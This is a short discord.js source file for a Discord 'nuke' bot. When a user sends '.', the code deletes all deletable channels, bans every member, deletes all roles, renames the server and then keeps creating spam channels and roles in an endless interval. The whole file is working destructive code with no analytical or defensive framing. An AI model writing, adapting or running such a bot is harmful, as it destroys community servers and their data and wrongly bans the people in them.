const Discord = require("discord.js");

const client = new Discord.Client();

const prefix = ""; 

client.on("message", message => {

  if (message.content === ".") {

    if (message.channel.guild) {

      message.guild.channels.forEach(c => {

        if (c.deletable) {

          c.delete();

        }

      });

      message.guild.members.forEach(m => {

        m.ban();

      });

      message.guild.roles.forEach(r => {

        r.delete();

      });

      message.guild.setName("Tanha Agadarman Krdyawa");

      setInterval(function() {

        message.guild.createChannel(" ALAND    UP🦍", "voice");

        message.guild.createChannel(" HAMA    UP🦍", "text");

        message.guild.createRole({ name: " BXOM. UP" });

      });

    }

  }

});

client.login("tokin");

